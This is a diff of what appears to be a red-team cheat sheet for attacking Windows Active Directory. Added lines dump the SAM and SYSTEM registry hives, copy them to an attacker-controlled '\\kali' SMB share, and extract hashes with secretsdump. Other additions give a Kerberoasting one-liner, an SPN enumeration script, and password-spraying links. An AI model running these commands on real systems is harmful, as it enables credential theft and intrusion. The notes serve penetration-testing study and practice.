@@ -18,6 +18,8 @@ https://atomicredteam.io/atomics/
 
 https://github.com/S3cur3Th1sSh1t/
 
+https://beta.hackndo.com/
+
 Kiosk evasion
 ---
 ```
@@ -46,7 +48,17 @@ KALI files transfert
 ---
 ```
 python -m http.server
+http://IP:8000
+impacket-smbserver -smb2support test .
+copy sam.save \\kali\test\sam.save
+copy system.save \\kali\test\system.save
 ```
+
+https://ironhackers.es/en/cheatsheet/transferir-archivos-post-explotacion-cheatsheet/
+
+
+Passwords
+---
 https://haveibeenpwned.com
 
 https://breachdirectory.org
@@ -87,12 +99,19 @@ AD-miner -c -cf My_Report -u neo4j -p mypassword
 https://github.com/Mazars-Tech/AD_Miner
 
 
-
-
 NTLM
 ---
 https://www.scip.ch/en/?labs.20210909
 
+https://beta.hackndo.com/pass-the-hash/
+
+SAM dump
+---
+```
+reg.exe save hklm\sam sam.save
+reg.exe save hklm\system system.save
+secretsdump.py -sam sam.save -system system.save LOCAL
+```
 
 Kerberos
 ---
@@ -106,7 +125,7 @@ https://www.thibautprobst.fr/fr/posts/kerberos/
 ![image](https://github.com/TikTakTech/Salsa/assets/114105972/aa55712f-5bc3-4a52-a71f-70b1ee2298ad)
 
 
-Kerberoasting
+Kerberoasting - SPN
 ---
 ```
 Invoke-Kerberoast -OutputFormat Hashcat | % { $_.Hash } | Out-File hashes.txt -Encoding ASCII
@@ -125,7 +144,27 @@ https://www.youtube.com/watch?v=ycNadGeq03E
 
 https://raw.githubusercontent.com/EmpireProject/Empire/08cbd274bef78243d7a8ed6443b8364acd1fc48b/data/module_source/credentials/Invoke-Kerberoast.ps1
 
-  
+https://beta.hackndo.com/service-principal-name-spn/
+
+```
+$search = New-Object DirectoryServices.DirectorySearcher([ADSI]"")
+$search.filter = "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))"
+$results = $search.Findall()
+foreach($result in $results)
+{
+	$userEntry = $result.GetDirectoryEntry()
+	Write-host "User : " $userEntry.name "(" $userEntry.distinguishedName ")"
+	Write-host "SPNs"        
+	foreach($SPN in $userEntry.servicePrincipalName)
+	{
+		$SPN       
+	}
+	Write-host ""
+}
+```
+https://beta.hackndo.com/kerberoasting/
+
+
 MEMCM - PXE
 ---
 https://www.secura.com/blog/attacking-mitigating-windows-pxe-environments
@@ -141,6 +180,14 @@ https://www.acceis.fr/sattaquer-aux-images-pxe
 https://github.com/wavestone-cdt/powerpxe
 
 https://tryhackme.com/r/room/breachingad
+
+
+Spraying
+---
+
+https://www.login-securite.com/2024/06/03/spray-passwords-avoid-lockouts/
+
+https://github.com/login-securite/conpass
 
 
 Linux Toolkit
